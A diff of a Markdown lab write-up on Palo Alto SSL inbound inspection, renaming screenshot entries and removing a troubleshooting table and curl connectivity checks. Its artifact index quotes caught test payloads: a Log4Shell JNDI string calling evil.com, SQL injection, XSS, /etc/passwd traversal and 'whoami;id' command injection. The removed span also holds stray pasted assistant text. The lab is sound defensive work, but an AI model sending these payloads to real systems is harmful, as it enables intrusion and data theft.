@@ -412,129 +412,30 @@ No.  Source          Destination    Protocol Length Info
 
 ![Palo Alto](screenshots/wireshark-reset-both-proof.png)
 
+**Session End Reason: Threat**
+
 ![Palo Alto](screenshots/monitor-traffic-logs-session-ends-because-threat.png)
 
 ---
 
-## Key Artifact Index
+### Key Artifact Index
 
 | Artifact File | Category | Technical Proof & Validation |
 | :--- | :--- | :--- |
-| **`ethernet1-1-vip-201.png`** | Interface Config | Binding secondary VIP `192.168.1.201/32` to external interface `ethernet1/1`. |
-| **`server-cert-with-private-key.png`** | PKI Config | `MERIDIAN-WEB-CERT` confirming private key stored locally (`Key: Checked`). |
-| **`dnat-inbound-policy-config.png`** | NAT Config | `DNAT-Inbound-Web-2` mapping `192.168.1.201:443` to `10.10.10.50:443` with return SNAT. |
-| **`decryption-inbound-rule-config.png`**| Decryption Config | Rule enforcing `Type: SSL Inbound Inspection` bound to `MERIDIAN-WEB-CERT`. |
-| **`security-rule-inbound-web.png`** | Security Policy | Post-NAT policy (`Allow-Inbound-HTTPS-Web`) attaching `Vulnerability Protection: strict`. |
-| **`cli-session-table-inbound-decrypt.png`**| Dataplane CLI | `show session` displaying active sessions with decryption proxy flag **`*NB`**. |
-| **`monitor-decryption-logs-inbound.png`**| Telemetry Log | Decryption monitor logging `Proxy Type: Inbound` and trusted verification. |
-| **`threat-pcap-log4shell-jndi.png`** | Packet Capture | Cleartext dump capturing `${jndi:ldap://evil.com/a}` inside decrypted HTTP header. |
-| **`threat-pcap-sqli-union-select.png`** | Packet Capture | Cleartext dump capturing `/?id=1 UNION SELECT 1` inside decrypted GET request. |
-| **`threat-pcap-xss-script-alert.png`** | Packet Capture | Cleartext dump capturing `/?search=<script>alert(1)</script>` inside decrypted GET request. |
-| **`threat-pcap-path-traversal-passwd.png`**| Packet Capture | Cleartext dump capturing `/../../../../etc/passwd` inside decrypted GET request. |
-| **`threat-pcap-command-injection.png`** | Packet Capture | Cleartext dump capturing `/?cmd=whoami;id` inside decrypted GET request. |
-| **`threat-logs-vulnerability-reset.png`**| Telemetry Log | Threat monitor verifying `Action: reset-both` across all injected exploit types. |
-| **`traffic-logs-session-end-threat.png`**| Telemetry Log | Traffic monitor confirming sessions terminated with `Session End Reason: threat`. |
-| **`wireshark-tcp-rst-frame-325.png`** | Wire Trace | Wire trace proving PAN-OS injected Frame 325 `[RST, ACK]` upon exploit detection. |
+| **`network-interfaces-second-ip-assigned.png`** | Interface Config | Binding secondary VIP `192.168.1.201/32` to external interface `ethernet1/1`. |
+| **`certificate-overview.png`** | PKI Config | `MERIDIAN-WEB-CERT` confirming private key stored locally (`Key: Checked`). |
+| **`creating-nat-translated-packet.png`** | NAT Config | `DNAT-Inbound-Web-2` mapping `192.168.1.201:443` to `10.10.10.50:443` with return SNAT. |
+| **`creating-decryption.png`** | Decryption Config | Rule enforcing `Type: SSL Inbound Inspection` bound to `MERIDIAN-WEB-CERT`. |
+| **`security-rule-actions.png`** | Security Policy | Post-NAT policy (`Allow-Inbound-HTTPS-Web`) attaching `Vulnerability Protection: strict`. |
+| **`show-session-all-filter-ssl-decrypt-yes.png`** | Dataplane CLI | `show session` displaying active sessions with decryption proxy flag **`*NB`**. |
+| **`monitor-decryption-logs.png`** | Telemetry Log | Decryption monitor logging `Proxy Type: Inbound` and trusted verification. |
+| **`packet-capture-log-4-shell.png`** | Packet Capture | Cleartext dump capturing `${jndi:ldap://evil.com/a}` inside decrypted HTTP header. |
+| **`packet-capture-sql-injection.png`** | Packet Capture | Cleartext dump capturing `/?id=1 UNION SELECT 1` inside decrypted GET request. |
+| **`packet-capture-xss.png`** | Packet Capture | Cleartext dump capturing `/?search=<script>alert(1)</script>` inside decrypted GET request. |
+| **`packet-capture-directory-traversal.png`** | Packet Capture | Cleartext dump capturing `/../../../../etc/passwd` inside decrypted GET request. |
+| **`packet-capture-cmd-injection.png`** | Packet Capture | Cleartext dump capturing `/?cmd=whoami;id` inside decrypted GET request. |
+| **`monitor-threat-logs-log-4-shell.png`** | Telemetry Log | Threat monitor verifying `Action: reset-both` across injected exploit types. |
+| **`monitor-traffic-logs-session-ends-because-threat.png`** | Telemetry Log | Traffic monitor confirming sessions terminated with `Session End Reason: threat`. |
+| **`wireshark-reset-both-proof.png`** | Wire Trace | Wire trace proving PAN-OS injected Frame 325 `[RST, ACK]` upon exploit detection. |
 
 ---
-
-## Troubleshooting & Engineering Lessons Learned
-
-| Challenge Encountered | Root Cause | Engineering Resolution |
-| :--- | :--- | :--- |
-| **GlobalProtect and Inbound Web SSL port collision on WAN.** | Both the remote access gateway and public web application require TCP port 443 on external interface `ethernet1/1`. | Assigned a secondary **Virtual IP (VIP `192.168.1.201/32`)** to `ethernet1/1`, isolating GlobalProtect on `.200` and the DMZ web server on `.201`. |
-| **Target web server failed to return traffic to external clients.** | The internal web server lacked a default route pointing back to the firewall for external public IP addresses. | Configured bidirectional NAT: paired Destination NAT with **Source Address Translation (Dynamic IP and Port on `ethernet1/2`)**, ensuring return traffic routes symmetrically through the firewall. |
-| **Decryption engine failed to inspect inbound TLS streams.** | Inbound Inspection requires an authorized copy of the server's private key; using a standard Forward Trust CA causes handshake negotiation errors. | Exported `MERIDIAN-WEB-CERT` as a PKCS12 archive, imported both the certificate and private key onto the PA-VM, and selected `Type: SSL Inbound Inspection`. |
-| **Security policy rule failed to match inbound DNAT traffic.** | In PAN-OS, security policies evaluate the **Post-NAT Zone** (`Trust`) but the **Pre-NAT Destination IP** (`192.168.1.201`). | Configured the security policy destination zone as `Trust` while keeping the destination address set to the public VIP (`192.168.1.201`). |
-EOF
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-Here is the complete, uninterrupted section. Delete the broken part in your editor and paste this in:
-
-***
-
-### Inbound Perimeter Publishing: Positive Control (VIP Access) vs. Negative Control (DMZ Isolation)
-
-Before executing exploit tests, both authorized path transit and perimeter isolation boundaries were validated from the external client (`192.168.1.100`).
-
-```text
-  [ External User (192.168.1.100) ] ─── 1. Access https://192.168.1.201 ───> [ PA-VM VIP ] ───> ALLOW (200 OK)
-  [ External User (192.168.1.100) ] ─── 2. Access https://10.10.10.50  ───> [ Direct IP ] ───> DROP (Timed Out)
-```
-
-#### A. Positive Control: Legitimate HTTPS Publishing via Firewall VIP
-Connecting to the published public VIP (`https://192.168.1.201:443`):
-
-* **CLI Diagnostic (`curl -vk`):**
-  ```bash
-  rich@rich-iMac:~$ curl -vk https://192.168.1.201
-  * Connected to 192.168.1.201 (192.168.1.201) port 443
-  * ALPN: curl offers h2,http/1.1
-  * TLSv1.3 (OUT), TLS handshake, Client hello (1):
-  * TLSv1.3 (IN), TLS handshake, Server hello (2):
-  * TLSv1.3 (IN), TLS handshake, Certificate (11):
-  * SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384
-  * Server certificate:
-  *   subject: CN=web.meridian.local
-  *   issuer: CN=Corp-Decryption-Sub-CA
-  < HTTP/1.1 200 OK
-  < Server: nginx
-  < Content-Length: 6197
-  ```
-* **Browser Verification:**
-  Navigating to `https://192.168.1.201` loaded the production web portal:
-  * **Application:** **`MERIDIAN FINANCIAL SERVICES - Enterprise Web Application Infrastructure`**
-  * **Status:** `SECURE WEB SERVICE ONLINE (Hostname: MERIDIAN-WEB1)`
-  * **Published Endpoint:** Public VIP `192.168.1.201:443` DNAT'd to Internal `10.10.10.50:443`.
-
-![Inbound Web Portal Online](screenshots/inbound-web-portal-online.png)
-
----
-
-#### B. Negative Control: DMZ Perimeter Isolation (Direct Private IP Blocked)
-To prove that internal RFC 1918 workloads cannot be reached directly without traversing the firewall's reverse-proxy VIP:
-
-* **CLI Diagnostic (`curl -vk`):**
-  ```bash
-  rich@rich-iMac:~$ curl -vk https://10.10.10.50
-  *   Trying 10.10.10.50:443...
-  * connect to 10.10.10.50 port 443 from 192.168.1.100 port 50306 failed: Connection timed out
-  * Failed to connect to 10.10.10.50 port 443 after 133376 ms: Couldn't connect to server
-  curl: (28) Failed to connect to 10.10.10.50 port 443 after 133376 ms: Couldn't connect to server
-  ```
-* **Browser Experience:**
-  Attempting to load `http://10.10.10.50` failed with:
-  `Looks like there's a problem with this site - Firefox can't connect to the server at 10.10.10.50 (Timed Out)`.
-
-![Direct Private IP Timeout](screenshots/direct-private-ip-timeout.png)
-
-> **Architectural Isolation Proof:** The internal web server is completely isolated from the untrusted network. External access is strictly constrained to the firewall's published VIP (`192.168.1.201`), ensuring 100% of incoming connections are decrypted, sanitized, and inspected by the Palo Alto threat engine.
